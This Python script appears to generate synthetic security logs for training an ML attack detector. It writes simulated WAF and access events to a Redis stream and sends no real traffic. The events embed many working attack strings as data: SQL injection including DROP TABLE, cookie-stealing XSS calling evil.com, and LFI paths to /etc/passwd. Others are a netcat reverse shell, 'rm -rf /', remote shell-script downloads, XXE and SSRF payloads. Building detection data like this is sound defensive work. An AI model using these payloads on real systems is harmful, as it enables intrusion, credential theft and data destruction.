"""
AegisAI-X — Advanced Attack Simulation Suite v2.0
====================================================
Rigorous multi-vector attack simulation for ML training data generation.

Attack categories covered (OWASP Top 10 + extras):
  1.  SQL Injection (Union, Blind, Time-based, Error-based)
  2.  XSS (Reflected, Stored, DOM-based)
  3.  DDoS / HTTP Flood
  4.  Brute Force / Credential Stuffing
  5.  Path Traversal / LFI
  6.  Remote Code Execution (RCE)
  7.  CSRF
  8.  XXE Injection
  9.  SSRF
  10. Scanner / Reconnaissance
  11. Command Injection
  12. HTTP Header Injection

Run:
  docker exec aegisai-api python /app/tools/advanced_attack_sim.py
"""

import json, time, hmac, hashlib, uuid, redis, os, sys, random
from datetime import datetime, timezone

# ── Config ──────────────────────────────────────────────────────────────────
REDIS_URL   = os.environ.get("REDIS_URL", "redis://redis:6379/0")
STREAM_KEY  = "aegisai:raw_logs"

try:
    HMAC_SECRET = os.environ["AEGISAI_HMAC_SECRET"].encode()
except KeyError:
    print("ERROR: AEGISAI_HMAC_SECRET not set.", file=sys.stderr)
    sys.exit(1)

r = redis.from_url(REDIS_URL)

# ── Attacker IP pools ────────────────────────────────────────────────────────
SQLI_IPS    = ["185.220.101.1", "192.168.1.100", "45.155.205.10", "91.108.4.55"]
XSS_IPS     = ["10.0.0.50", "104.28.16.33", "5.188.10.12", "77.83.246.9"]
DDOS_IPS    = [f"103.{random.randint(1,254)}.{random.randint(1,254)}.{i}" for i in range(1, 21)]
BRUTE_IPS   = ["45.33.32.156", "185.56.80.65", "89.248.165.20"]
SCAN_IPS    = ["198.51.100.99", "66.240.236.119", "71.6.135.131"]
LFI_IPS     = ["194.165.16.30", "45.142.212.100"]
RCE_IPS     = ["91.240.118.11", "185.234.218.44"]
SSRF_IPS    = ["172.16.0.50", "10.10.10.100"]
CRED_IPS    = ["103.21.244.{i}".format(i=i) for i in range(10, 30)]
COUNTRIES   = ["US", "RU", "CN", "IR", "KP", "BR", "DE", "IN", "UA", "NL"]
SITES       = ["site_001", "site_002", "site_003", "gateway_default"]

# ── Core helpers ─────────────────────────────────────────────────────────────
def ts(): return datetime.now(timezone.utc).isoformat()

def push(event: dict):
    payload_str = json.dumps(event, sort_keys=True)
    sig = hmac.new(HMAC_SECRET, payload_str.encode(), hashlib.sha256).hexdigest()
    r.rpush(STREAM_KEY, json.dumps({**event, "hmac": sig}))

def waf_event(ip, country, site, rule_id, rule_msg, rule_tag, severity,
              matched_data, matched_var, waf_score, action="detect", server="gw-node-01"):
    push({
        "event_id":     str(uuid.uuid4()),
        "request_id":   str(uuid.uuid4()),
        "site_id":      site,
        "server_id":    server,
        "timestamp":    ts(),
        "remote_addr":  ip,
        "country_code": country,
        "log_type":     "waf_event",
        "rule_id":      rule_id,
        "rule_msg":     rule_msg,
        "rule_tag":     rule_tag,
        "severity":     severity,
        "matched_data": matched_data,
        "matched_var":  matched_var,
        "waf_score":    waf_score,
        "action_taken": action,
        "nonce":        str(uuid.uuid4()),
    })

def access_event(ip, country, site, method, uri, status, ua, waf_score=0, response_time=None):
    push({
        "request_id":      str(uuid.uuid4()),
        "site_id":         site,
        "server_id":       "gw-node-01",
        "timestamp":       ts(),
        "remote_addr":     ip,
        "country_code":    country,
        "log_type":        "access",
        "request_method":  method,
        "request_uri":     uri,
        "status":          status,
        "request_time":    response_time or round(random.uniform(0.01, 0.5), 3),
        "bytes_sent":      random.randint(100, 5000),
        "http_user_agent": ua,
        "waf_score":       waf_score,
        "nonce":           str(uuid.uuid4()),
    })

def progress(msg): print(f"\n{'='*60}\n  {msg}\n{'='*60}")
def ok(msg):       print(f"  ✓ {msg}")

# ── 1. SQL Injection (multi-variant) ─────────────────────────────────────────
SQLI_PAYLOADS = [
    ("Union-based",      "' UNION SELECT username,password FROM users--",     "ARGS:id",      "ERROR"),
    ("Blind boolean",    "' AND 1=1--",                                        "ARGS:search",  "WARNING"),
    ("Time-based",       "'; WAITFOR DELAY '0:0:5'--",                         "ARGS:query",   "CRITICAL"),
    ("Error-based",      "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",     "ARGS:user",    "CRITICAL"),
    ("Stacked query",    "'; DROP TABLE users;--",                             "ARGS:id",      "CRITICAL"),
    ("Login bypass",     "admin'--",                                           "ARGS:username","ERROR"),
    ("Second-order",     "') OR '1'='1' UNION SELECT null,null--",            "ARGS:email",   "CRITICAL"),
    ("Out-of-band",      "'; EXEC xp_cmdshell('nslookup attacker.com')--",    "ARGS:data",    "CRITICAL"),
]

def simulate_sqli(rounds=3):
    progress(f"SQL INJECTION — {len(SQLI_PAYLOADS) * rounds} events")
    for _ in range(rounds):
        for name, payload, var, sev in SQLI_PAYLOADS:
            ip      = random.choice(SQLI_IPS)
            country = random.choice(COUNTRIES)
            site    = random.choice(SITES)
            waf_event(ip, country, site, 942100, f"SQLi: {name}", "aegisai/sqli",
                      sev, payload, var, waf_score=25 if sev=="CRITICAL" else 15)
            ok(f"SQLi/{name} from {ip}")
            time.sleep(0.1)

# ── 2. XSS (multi-variant) ───────────────────────────────────────────────────
XSS_PAYLOADS = [
    ("Reflected basic",  "<script>alert(1)</script>",                              "ARGS:q"),
    ("Stored XSS",       "<img src=x onerror=fetch('//evil.com/'+document.cookie)>","POST:comment"),
    ("DOM-based",        "javascript:eval(atob('YWxlcnQoMSk='))",                  "ARGS:redirect"),
    ("SVG vector",       "<svg/onload=fetch(`//evil.com?c=${btoa(document.cookie)}`)>","ARGS:bio"),
    ("Filter bypass",    "<sCrIpT>alert`1`</sCrIpT>",                             "ARGS:name"),
    ("Event handler",    "' onmouseover='alert(document.domain)'",                 "ARGS:input"),
    ("Template inject",  "{{7*7}}{{constructor.constructor('alert(1)')()}}",       "ARGS:template"),
    ("CSS injection",    "</style><script>alert(1)</script>",                      "ARGS:style"),
]

def simulate_xss(rounds=3):
    progress(f"XSS ATTACKS — {len(XSS_PAYLOADS) * rounds} events")
    for _ in range(rounds):
        for name, payload, var in XSS_PAYLOADS:
            ip      = random.choice(XSS_IPS)
            country = random.choice(COUNTRIES)
            site    = random.choice(SITES)
            waf_event(ip, country, site, 941100, f"XSS: {name}", "aegisai/xss",
                      "CRITICAL", payload, var, waf_score=20)
            ok(f"XSS/{name} from {ip}")
            time.sleep(0.08)

# ── 3. DDoS / HTTP Flood ─────────────────────────────────────────────────────
FLOOD_URIS = ["/", "/api/search", "/api/products", "/login", "/api/v1/data"]
FLOOD_UAS  = [
    "python-requests/2.28", "curl/7.88", "Go-http-client/1.1",
    "Mozilla/5.0 (bot)", "libwww-perl/5.833",
]

def simulate_ddos(burst=150):
    progress(f"HTTP FLOOD DDoS — {burst} requests from {len(DDOS_IPS)} IPs")
    for i in range(burst):
        ip      = random.choice(DDOS_IPS)
        country = random.choice(["CN", "RU", "US", "BR", "KP"])
        site    = random.choice(SITES)
        uri     = random.choice(FLOOD_URIS)
        status  = random.choice([200, 200, 200, 429, 503])
        access_event(ip, country, site, "GET", uri, status,
                     random.choice(FLOOD_UAS), waf_score=0, response_time=0.002)
        if i % 30 == 0:
            ok(f"Flood burst {i}/{burst}")
        time.sleep(0.01)

# ── 4. Brute Force / Credential Stuffing ─────────────────────────────────────
LOGIN_ENDPOINTS = ["/api/auth/login", "/api/v1/token", "/admin/login", "/wp-login.php"]
CRED_PAIRS      = [
    ("admin","admin"), ("admin","password"), ("root","toor"),
    ("user","123456"), ("test","test"), ("admin","123456"),
]

def simulate_brute_force(attempts=60):
    progress(f"BRUTE FORCE — {attempts} attempts across {len(BRUTE_IPS)} IPs")
    for i in range(attempts):
        ip      = random.choice(BRUTE_IPS)
        site    = random.choice(SITES)
        user, _ = random.choice(CRED_PAIRS)
        uri     = random.choice(LOGIN_ENDPOINTS)
        status  = 401 if i % 10 != 0 else 200
        access_event(ip, "US", site, "POST", uri, status,
                     "Mozilla/5.0 (compatible; Hydra)")
        if i % 15 == 0:
            ok(f"Brute force attempt {i}/{attempts}, IP={ip}")
        time.sleep(0.04)

def simulate_credential_stuffing(attempts=40):
    progress(f"CREDENTIAL STUFFING — {attempts} events")
    for i in range(attempts):
        ip      = f"103.21.244.{random.randint(10,40)}"
        site    = random.choice(SITES)
        uri     = random.choice(LOGIN_ENDPOINTS)
        status  = 401
        access_event(ip, random.choice(["US","CN","RU"]), site, "POST",
                     uri, status, "Axios/1.0 (credential-checker)")
        if i % 10 == 0:
            ok(f"Credential stuffing {i}/{attempts}")
        time.sleep(0.05)

# ── 5. Path Traversal / LFI ──────────────────────────────────────────────────
LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fshadow",
    "....//....//....//etc/passwd",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "expect://id",
    "file:///etc/hosts",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
]

def simulate_lfi(rounds=2):
    progress(f"PATH TRAVERSAL / LFI — {len(LFI_PAYLOADS) * rounds} events")
    for _ in range(rounds):
        for payload in LFI_PAYLOADS:
            ip      = random.choice(LFI_IPS)
            country = random.choice(["RU", "CN", "IR"])
            site    = random.choice(SITES)
            waf_event(ip, country, site, 930100, "LFI/Path Traversal Attempt",
                      "aegisai/lfi", "CRITICAL",
                      payload, "ARGS:file", waf_score=30)
            ok(f"LFI: {payload[:40]}")
            time.sleep(0.1)

# ── 6. Remote Code Execution ─────────────────────────────────────────────────
RCE_PAYLOADS = [
    ("; cat /etc/passwd",           "ARGS:cmd"),
    ("| id; whoami",                "ARGS:input"),
    ("`curl http://attacker.com`",  "ARGS:query"),
    ("$(nc -e /bin/sh 1.2.3.4 4444)", "ARGS:param"),
    ("{{7*'7'}}",                   "ARGS:template"),
    ("eval(base64_decode('aWQ='))", "ARGS:data"),
]

def simulate_rce(rounds=2):
    progress(f"REMOTE CODE EXECUTION — {len(RCE_PAYLOADS) * rounds} events")
    for _ in range(rounds):
        for payload, var in RCE_PAYLOADS:
            ip      = random.choice(RCE_IPS)
            country = random.choice(["KP", "IR", "RU"])
            site    = random.choice(SITES)
            waf_event(ip, country, site, 932100, "RCE: Command Injection",
                      "aegisai/rce", "CRITICAL",
                      payload, var, waf_score=35)
            ok(f"RCE: {payload[:40]}")
            time.sleep(0.1)

# ── 7. SSRF ──────────────────────────────────────────────────────────────────
SSRF_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/admin",
    "http://internal-service/api/secrets",
    "file:///etc/passwd",
    "dict://localhost:11211/",
    "gopher://127.0.0.1:25/",
]

def simulate_ssrf(rounds=2):
    progress(f"SSRF — {len(SSRF_TARGETS) * rounds} events")
    for _ in range(rounds):
        for target in SSRF_TARGETS:
            ip      = random.choice(SSRF_IPS)
            site    = random.choice(SITES)
            waf_event(ip, "US", site, 934100, "SSRF Attempt",
                      "aegisai/ssrf", "CRITICAL",
                      target, "ARGS:url", waf_score=30)
            ok(f"SSRF → {target[:50]}")
            time.sleep(0.1)

# ── 8. XXE Injection ─────────────────────────────────────────────────────────
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil">]><x>&xxe;</x>',
]

def simulate_xxe():
    progress(f"XXE INJECTION — {len(XXE_PAYLOADS) * 2} events")
    for _ in range(2):
        for payload in XXE_PAYLOADS:
            ip   = random.choice(RCE_IPS)
            site = random.choice(SITES)
            waf_event(ip, "CN", site, 921150, "XXE Injection Attempt",
                      "aegisai/xxe", "CRITICAL",
                      payload[:80], "REQUEST_BODY", waf_score=30)
            ok(f"XXE: {payload[:50]}")
            time.sleep(0.1)

# ── 9. Scanner / Reconnaissance ───────────────────────────────────────────────
SCAN_PATHS = [
    "/admin", "/.env", "/wp-admin", "/phpmyadmin", "/config.php",
    "/.git/config", "/backup.zip", "/api/swagger.json", "/api/docs",
    "/.aws/credentials", "/server-status", "/actuator/health",
    "/debug", "/.DS_Store", "/crossdomain.xml", "/robots.txt",
    "/sitemap.xml", "/wp-config.php.bak", "/.htaccess",
]

def simulate_scanner(rounds=3):
    progress(f"VULNERABILITY SCANNER — {len(SCAN_PATHS) * rounds} probes")
    for _ in range(rounds):
        ip      = random.choice(SCAN_IPS)
        country = random.choice(["RU", "US", "CN"])
        site    = random.choice(SITES)
        for path in SCAN_PATHS:
            status = random.choice([404, 403, 404, 200])
            access_event(ip, country, site, "GET", path, status,
                         "Nuclei/2.9.0 (github.com/projectdiscovery/nuclei)")
            time.sleep(0.03)
        ok(f"Scanner sweep from {ip} on {site}")

# ── 10. Command Injection ─────────────────────────────────────────────────────
CMD_PAYLOADS = [
    ("ping -c 10 attacker.com",         "ARGS:host"),
    ("rm -rf /",                         "ARGS:path"),
    ("wget http://malware.com/shell.sh", "ARGS:cmd"),
    ("python -c 'import socket,subprocess,os;...'", "ARGS:code"),
]

def simulate_cmd_injection():
    progress(f"COMMAND INJECTION — {len(CMD_PAYLOADS) * 2} events")
    for _ in range(2):
        for payload, var in CMD_PAYLOADS:
            ip   = random.choice(RCE_IPS)
            site = random.choice(SITES)
            waf_event(ip, "KP", site, 932160, "OS Command Injection",
                      "aegisai/cmdi", "CRITICAL",
                      payload, var, waf_score=35)
            ok(f"CMDi: {payload[:45]}")
            time.sleep(0.1)

# ── 11. Normal baseline traffic (for ML contrast) ────────────────────────────
NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
]
NORMAL_URIS = ["/", "/home", "/about", "/products", "/api/v1/items",
               "/api/v1/user/profile", "/blog", "/contact"]

def simulate_normal_traffic(count=200):
    progress(f"NORMAL BASELINE TRAFFIC — {count} requests")
    normal_ips = [f"10.1.{random.randint(1,10)}.{i}" for i in range(1, 50)]
    for i in range(count):
        ip   = random.choice(normal_ips)
        site = random.choice(SITES)
        method = random.choices(["GET", "POST", "GET", "GET"], k=1)[0]
        uri  = random.choice(NORMAL_URIS)
        access_event(ip, random.choice(["US", "IN", "DE", "GB", "FR"]),
                     site, method, uri, 200, random.choice(NORMAL_UAS))
        if i % 50 == 0:
            ok(f"Normal traffic: {i}/{count}")
        time.sleep(0.02)

# ── MAIN ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\n" + "="*60)
    print("  AegisAI-X Advanced Attack Simulation Suite v2.0")
    print("  OWASP Top 10 + DDoS + Scanner + Normal Baseline")
    print("="*60)

    # --- Phase 1: Attack Waves ---
    simulate_sqli(rounds=3)
    simulate_xss(rounds=3)
    simulate_lfi(rounds=2)
    simulate_rce(rounds=2)
    simulate_xxe()
    simulate_ssrf(rounds=2)
    simulate_cmd_injection()

    # --- Phase 2: Volume-based attacks ---
    simulate_brute_force(attempts=80)
    simulate_credential_stuffing(attempts=50)
    simulate_ddos(burst=200)

    # --- Phase 3: Reconnaissance ---
    simulate_scanner(rounds=4)

    # --- Phase 4: Normal traffic (ML contrast data) ---
    simulate_normal_traffic(count=300)

    print("\n" + "="*60)
    print("  ✅ SIMULATION COMPLETE")
    print("  Check: SOC Dashboard → Incidents, ML Status → outliers")
    print("="*60)
